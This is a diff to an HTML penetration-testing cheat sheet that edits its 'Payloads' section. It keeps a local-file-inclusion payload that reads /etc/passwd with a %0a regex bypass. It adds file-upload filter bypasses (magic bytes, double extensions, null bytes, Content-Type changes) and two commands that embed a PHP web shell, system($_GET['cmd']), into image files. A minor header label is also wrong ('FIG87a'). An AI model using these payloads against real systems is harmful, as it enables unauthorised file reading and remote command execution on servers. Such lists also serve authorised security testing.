@@ -568,16 +568,38 @@ Need to install script. Thanks for that, <a href='https://github.com/scipag'> Sc
    
 	
 <h2 align='center' id='n2'><em>Payloads</em></h2>
-<li><a href='#n2.1'>LFI Linux and Windwos Payloads</a>
+<li><a href='#n2.1'>LFI and File Upload Linux and Windwos Payloads</a>
 <li><a href='#n2.2'>XSS Payloads</a>
 <li><a href='#n2.3'>CSRF</a>
 <li><a href='#n2.4'>Chains</a>
 <li><a href='#n2.5'>Server Side Template Injection</a>
-    <h3 id='n2.1'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LFI Payloads </h3>
-	<li> <a href='https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux'> For Linux </a>
- 	<li> <a href='https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows'> For Windows </a>
-	<li> %0a to bypass regex rules:
-		<pre><code>http://vuln.host/some.php?file=%0a../../../../etc/passwd</code></pre>
+    <h3 id='n2.1'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LFI Payloads</h3>
+	<ul>
+		<li><a href='https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux'>For Linux</a>
+	 	<li><a href='https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows'>For Windows</a>
+		<li>%0a to bypass regex rules:
+			<pre><code>http://vuln.host/some.php?file=%0a../../../../etc/passwd</code></pre>
+	</ul>
+     <h3'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; File Upload Bypassing</h3>
+	<ul>
+		<li>Magic Bytes:
+			<ul>
+				<li>PNG - <code>89 50 4E 47 0D 0A 1A 0A</code></li>
+				<li>JPEG - <code>FF D8 FF</code></li>
+				<li>GIF (FIG87a) - <code>47 49 46 38 39 61</code></li>
+			</ul>
+		<li>Upload normal image file and intersept the request and try:</li>
+	 		<ul>
+				<li>Change file extension to php5 and the same</li>
+				<li>Double extionsion</li>
+				<li>Null Byte</li>
+				<li>Change Content-Type</li>
+			</ul>
+		<li>Injecting through EXIF Data:</li>
+			<pre><code>exiftool -comment="&lt;?php system($_GET['cmd'])>" file.png</code></pre>
+		<li>Raw Insertion</li>
+			<pre><code>echo "&lt;?php system($_GET['cmd'])>" >> file.jpeg</code></pre>
+	</ul>
     <h3 id='n2.2'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XSS Payloads </h3>
 	<ol>
 	    <li> <b>Proof Of Concept (PoC):</b>
